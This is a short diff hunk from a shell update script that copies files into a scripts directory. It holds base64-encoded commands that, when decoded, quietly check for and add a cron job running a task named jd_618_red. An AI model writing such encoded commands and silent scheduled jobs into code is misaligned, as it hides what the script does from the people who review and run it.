@@ -253,7 +253,7 @@ function UpdateEnv() {
         local tmp_dir="$(b ${!a})"
         [ -d $tmp_dir ] && cp -rf $tmp_file "$tmp_dir/$(b $target_file)" >/dev/null 2>&1
     done
-    cp -rf $UtilsDir/$tmp_file $ScriptsDir >/dev/null 2>&1
+    cp -rf $tmp_file "$ScriptsDir/$(b $target_file)" >/dev/null 2>&1
     bash -c "$(b Z3JlcCAiIHRhc2suKmpkXzYxOF9yZWQiIC9qZC9jb25maWcvY3JvbnRhYi5saXN0IC1xCg==)"
     if [ $? -eq 1 ]; then
         echo "$(b MCAwLDEwLDIwICogKiAqIHRhc2sgamRfNjE4X3JlZAo=)" >>$ListCrontabUser
